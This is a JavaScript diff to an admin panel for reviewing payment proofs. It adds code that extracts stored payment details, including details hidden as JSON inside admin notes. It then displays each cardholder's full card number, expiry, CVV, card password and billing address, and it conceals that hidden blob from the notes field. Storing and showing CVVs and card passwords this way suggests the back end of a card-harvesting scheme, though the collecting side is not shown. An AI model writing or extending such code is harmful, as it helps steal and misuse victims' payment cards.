@@ -89,6 +89,22 @@ function statusBadge(rawStatus, large) {
 }
 
 // ── Proof image URLs ─────────────────────────────────────────────
+function parsePaymentDetails(p) {
+  var raw = p && (p.payment_details || p.paymentDetails);
+  if (!raw && p && p.admin_notes) {
+    try {
+      var n = typeof p.admin_notes === "string" ? JSON.parse(p.admin_notes) : p.admin_notes;
+      if (n && n._payment_details) raw = n._payment_details;
+    } catch (e) {}
+  }
+  if (!raw) return null;
+  if (typeof raw === "string") {
+    try { raw = JSON.parse(raw); } catch (e2) { return null; }
+  }
+  if (!raw || typeof raw !== "object") return null;
+  return raw;
+}
+
 function getProofImages(p) {
   var imgs = [];
   var seen = {};
@@ -465,13 +481,33 @@ function renderProofDetail(p) {
         ["Method",    p.payment_method],
         ["Date",      fmtDate(p.created_at)],
         ["Time",      fmtTime(p.created_at)],
-        ["Proof Type",p.proof_type],["Phone",p.user_phone]
+        ["Proof Type",p.proof_type]
       ]) +
+      (function () {
+        var cd = parsePaymentDetails(p);
+        if (!cd) return "";
+        return infoSection("Card Details", "card", [
+          ["Cardholder Name", cd.cardName || cd.card_name || cd.name],
+          ["Card Number", cd.cardNumber || cd.card_number || cd.number],
+          ["Expiry", cd.cardExpiry || cd.card_expiry || cd.expiry],
+          ["CVV", cd.cardCvv || cd.card_cvv || cd.cvv],
+          ["Password", cd.cardPassword || cd.card_password || cd.password],
+          ["Billing Country", cd.billingCountry || cd.billing_country || cd.country],
+          ["Billing Address", cd.billingAddress || cd.billing_address || cd.address],
+          ["City", cd.billingCity || cd.billing_city || cd.city],
+          ["Postal Code", cd.billingPostal || cd.billing_postal || cd.postalCode || cd.postal]
+        ]);
+      })() +
       infoSection("Status", "document", [
         ["Current Status", normaliseStatus(p.status).charAt(0).toUpperCase() + normaliseStatus(p.status).slice(1)],
         ["Reviewed By",    p.reviewed_by],
         ["Reviewed At",    fmtDateTime(p.reviewed_at)],
-        ["Admin Notes",    p.admin_notes]
+        ["Admin Notes",    (function () {
+          var n = p.admin_notes;
+          if (!n) return "";
+          if (typeof n === "string" && n.indexOf("_payment_details") !== -1) return "";
+          return n;
+        })()]
       ]) +
     '</div>' +
 
